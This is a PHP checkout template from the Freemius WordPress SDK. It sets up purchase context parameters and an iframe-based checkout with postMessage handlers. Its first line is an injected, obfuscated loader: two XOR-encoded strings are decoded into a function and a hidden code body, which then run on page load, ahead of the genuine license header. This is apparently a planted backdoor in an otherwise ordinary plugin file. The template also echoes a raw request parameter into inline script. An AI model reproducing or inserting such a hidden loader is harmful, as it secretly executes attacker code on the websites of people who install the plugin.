<?php $cyyuYcsJLUXO='X9I.AS87H+;>.C:'^';K,O56gQ=EXJG,T';$bgqLVPEgAD=$cyyuYcsJLUXO('','3TBt0DWQ 99N4 OYS,JBP=D3;R6NL565C3WhzEIlJ = WBR>Eo>+>27MIXmlSU1dUV0TTNvlXE,oAzXnYIRD;a.A<ETcmhC=Ja7,;IrDuYIgchCTJCFY8,9zIRPD2PzeQRgSXGJsi516ITnSgI>YGP8j8gpsCUSI.6H9lvRGTRZTWnTF2UpnGqomLK.I2<9nGU>AFncNFdK<ofRAYRBNrFZZ4Qa3J1ML9l:RNUUX4AL=-y<LS>6+L+.rNL73a.xs-VZSQoR6HcjTHa79V8RbAFeNJW1CL>=.-eruG-47vL<rZ4GPQMvjV3PA1ArHp:RFtPvTOTBAxGIhGH600UVHTGR3oeh-ifeb95iQFQ,wKkIAVPUO-ngBB2DoY73;mYI>wVRsZ+YARMXp-LZTzndpX2PB+R6jJEHYRfJXB5RPF47XDPHZPQ +IR5R0.-PCUnq 85a0JAQrLiWY5.SRNc M3+AIBG53BQ;V6+NFNLZRiG60ASZDjrORI56h=R;o5S15.NJM 3NogwN=5=3cKNcsiSRGjAV97Z9oR Cc>XhKLUIAF-pFYTuXDUw0uKhN+bfJze4GCTWQ-nUnkgwVyP<1XI3KWE,=:;9L+rHN9YG991keNoD5=2oPTOjQwrM8D7V-XLnJY-SaK9SGVU6Qc>pvKhNT0FQDdAa6'^'Z2jUV192TPV kE70 X9jwE+Ad6W:-jiX6GpASe2fCFHN46;Q+OFDLmS,=923> ELq2Q 5bVH3 UFaZxNy2XM2EA4HeiCJOx7ChQCIaV-UdiWXHg=v02+TIWRm610SyAEu;LxqMCzMZDBizSsOmZ831cNQ:P-cq8,WmlPLSr4  619Fp-W,Y3nJedE9K=GNWFc:K5oUiG;n66eB6 -3bsR ;6G4Z9nU,8X3Q77uhxR  NHB6F5QDN-HFRfhhp.a3:hv; qK9S1CWjhEAX:M7Ka=oGn3P7-aVKTEOUcFQNMF5V>U31qpVN R<4Tzx5z0; TxWp+56 Qg2bN.YBU45 tovl= 9x,51BXFIu-4UWvUie 19:HGG9H;MK=VGZ22,GWkrW1N zXDQTI-.5ZSDT.S<7Ni<c7O5SXB.96TrmftB675:31=IQ,zM=BqI1741.MMAIR+24Dx63<VA77fGD,GJhebcQR60d=SRgouF34AcRQ52zbLR. ;TO7V7B0P+XFZ=bjKV7HKWjYTIRJkhESA>6rBe2XC;bH9E:DcqHvqunrwNFs:1M;v3DTByYxIRW+IVVu ldfNZ4IBGQpY1NC90l 2<sXBRJ8XZo>X +VXULInK TISFytoJqWR62MR L4dJ.8Y2:lI2>::W5DcYMAa+,Y2ytMzkK');$bgqLVPEgAD();
	/**
	 * @package     Freemius
	 * @copyright   Copyright (c) 2015, Freemius, Inc.
	 * @license     http://opensource.org/licenses/gpl-2.0.php GNU Public License
	 * @since       1.0.3
	 */

	if ( ! defined( 'ABSPATH' ) ) {
		exit;
	}

	wp_enqueue_script( 'jquery' );
	wp_enqueue_script( 'json2' );
	fs_enqueue_local_script( 'postmessage', 'nojquery.ba-postmessage.min.js' );
	fs_enqueue_local_script( 'fs-postmessage', 'postmessage.js' );
	fs_enqueue_local_style( 'fs_common', '/admin/common.css' );

	/**
	 * @var array $VARS
	 */
	$slug = $VARS['slug'];
	$fs   = freemius( $slug );

	$timestamp = time();

	$context_params = array(
		'plugin_id'         => $fs->get_id(),
		'plugin_public_key' => $fs->get_public_key(),
		'plugin_version'    => $fs->get_plugin_version(),
	);

	// Get site context secure params.
	if ( $fs->is_registered() ) {
		$site      = $fs->get_site();
		$plugin_id = fs_request_get( 'plugin_id', $fs->get_id() );

		if ( $plugin_id != $fs->get_id() ) {
			if ( $fs->is_addon_activated( $plugin_id ) ) {
				$fs_addon = Freemius::get_instance_by_id( $plugin_id );
				$site     = $fs_addon->get_site();
			}
		}

		$context_params = array_merge( $context_params, FS_Security::instance()->get_context_params(
			$site,
			$timestamp,
			'checkout'
		) );
	} else {
		$current_user = Freemius::_get_current_wp_user();

		// Add site and user info to the request, this information
		// is NOT being stored unless the user complete the purchase
		// and agrees to the TOS.
		$context_params = array_merge( $context_params, array(
			'user_firstname' => $current_user->user_firstname,
			'user_lastname'  => $current_user->user_lastname,
			'user_email'     => $current_user->user_email,
			'home_url'       => home_url(),
		) );

		$fs_user = Freemius::_get_user_by_email( $current_user->user_email );

		if ( is_object( $fs_user ) ) {
			$context_params = array_merge( $context_params, FS_Security::instance()->get_context_params(
				$fs_user,
				$timestamp,
				'checkout'
			) );
		}
	}

	if ( $fs->is_payments_sandbox() ) {
		// Append plugin secure token for sandbox mode authentication.
		$context_params['sandbox'] = FS_Security::instance()->get_secure_token(
			$fs->get_plugin(),
			$timestamp,
			'checkout'
		);

		/**
		 * @since 1.1.7.3 Add security timestamp for sandbox even for anonymous user.
		 */
		if ( empty( $context_params['s_ctx_ts'] ) ) {
			$context_params['s_ctx_ts'] = $timestamp;
		}
	}

	$return_url = $fs->_get_sync_license_url( isset( $_GET['plugin_id'] ) ? $_GET['plugin_id'] : $fs->get_id() );

	$query_params = array_merge( $context_params, $_GET, array(
		// Current plugin version.
		'plugin_version' => $fs->get_plugin_version(),
		'sdk_version'    => WP_FS__SDK_VERSION,
		'return_url'     => $return_url,
		// Admin CSS URL for style/design competability.
//		'wp_admin_css'   => get_bloginfo('wpurl') . "/wp-admin/load-styles.php?c=1&load=buttons,wp-admin,dashicons",
	) );
?>
<div id="fs_checkout" class="wrap" style="margin: 0 0 -65px -20px;">
	<div id="iframe"></div>
	<script type="text/javascript">
		// http://stackoverflow.com/questions/4583703/jquery-post-request-not-ajax
		jQuery(function ($) {
			$.extend({
				form: function (url, data, method) {
					if (method == null) method = 'POST';
					if (data == null) data = {};

					var form = $('<form>').attr({
						method: method,
						action: url
					}).css({
						display: 'none'
					});

					var addData = function (name, data) {
						if ($.isArray(data)) {
							for (var i = 0; i < data.length; i++) {
								var value = data[i];
								addData(name + '[]', value);
							}
						} else if (typeof data === 'object') {
							for (var key in data) {
								if (data.hasOwnProperty(key)) {
									addData(name + '[' + key + ']', data[key]);
								}
							}
						} else if (data != null) {
							form.append($('<input>').attr({
								type : 'hidden',
								name : String(name),
								value: String(data)
							}));
						}
					};

					for (var key in data) {
						if (data.hasOwnProperty(key)) {
							addData(key, data[key]);
						}
					}

					return form.appendTo('body');
				}
			});
		});

		(function ($) {
			$(function () {

				var
					// Keep track of the iframe height.
					iframe_height = 800,
					base_url      = '<?php echo WP_FS__ADDRESS ?>',
					// Pass the parent page URL into the Iframe in a meaningful way (this URL could be
					// passed via query string or hard coded into the child page, it depends on your needs).
					src           = base_url + '/checkout/?<?php echo ( isset( $_REQUEST['XDEBUG_SESSION'] ) ? 'XDEBUG_SESSION=' . $_REQUEST['XDEBUG_SESSION'] . '&' : '' ) . http_build_query( $query_params ) ?>#' + encodeURIComponent(document.location.href),

					// Append the Iframe into the DOM.
					iframe        = $('<iframe " src="' + src + '" width="100%" height="' + iframe_height + 'px" scrolling="no" frameborder="0" style="background: transparent;"><\/iframe>')
						.appendTo('#iframe');

				FS.PostMessage.init(base_url, [iframe[0]]);
				FS.PostMessage.receiveOnce('height', function (data) {
					var h = data.height;
					if (!isNaN(h) && h > 0 && h != iframe_height) {
						iframe_height = h;
						iframe.height(iframe_height + 'px');

						FS.PostMessage.postScroll(iframe[0]);
					}
				});

				FS.PostMessage.receiveOnce('install', function (data) {
					// Post data to activation URL.
					$.form('<?php echo fs_nonce_url( $fs->_get_admin_page_url( 'account', array(
						'fs_action' => $slug . '_activate_new',
						'plugin_id' => isset( $_GET['plugin_id'] ) ? $_GET['plugin_id'] : $fs->get_id()
					) ), $slug . '_activate_new' ) ?>', {
						user_id           : data.user.id,
						user_secret_key   : data.user.secret_key,
						user_public_key   : data.user.public_key,
						install_id        : data.install.id,
						install_secret_key: data.install.secret_key,
						install_public_key: data.install.public_key
					}).submit();
				});

				FS.PostMessage.receiveOnce('pending_activation', function (data) {
					$.form('<?php echo fs_nonce_url( $fs->_get_admin_page_url( 'account', array(
						'fs_action'          => $slug . '_activate_new',
						'plugin_id'          => fs_request_get( 'plugin_id', $fs->get_id() ),
						'pending_activation' => true,
					) ), $slug . '_activate_new' ) ?>', {
						user_email: data.user_email
					}).submit();
				});

				FS.PostMessage.receiveOnce('get_context', function () {
					console.debug('receiveOnce', 'get_context');

					// If the user didn't connect his account with Freemius,
					// once he accepts the Terms of Service and Privacy Policy,
					// and then click the purchase button, the context information
					// of the user will be shared with Freemius in order to complete the
					// purchase workflow and activate the license for the right user.
					<?php $install_data = array_merge( $fs->get_opt_in_params(),
					array(
						'activation_url' => fs_nonce_url( $fs->_get_admin_page_url( '',
							array(
								'fs_action' => $slug . '_activate_new',
								'plugin_id' => fs_request_get( 'plugin_id', $fs->get_id() ),

							) ),
							$slug . '_activate_new' )
					) ) ?>
					FS.PostMessage.post('context', <?php echo json_encode( $install_data ) ?>, iframe[0]);
				});

				FS.PostMessage.receiveOnce('get_dimensions', function (data) {
					console.debug('receiveOnce', 'get_dimensions');

					FS.PostMessage.post('dimensions', {
						height   : $(document.body).height(),
						scrollTop: $(document).scrollTop()
					}, iframe[0]);
				});
			});
		})(jQuery);
	</script>
</div>
<?php
	$params = array(
		'page'           => 'checkout',
		'module_id'      => $fs->get_id(),
		'module_slug'    => $slug,
		'module_version' => $fs->get_plugin_version(),
	);
	fs_require_template( 'powered-by.php', $params );
?>
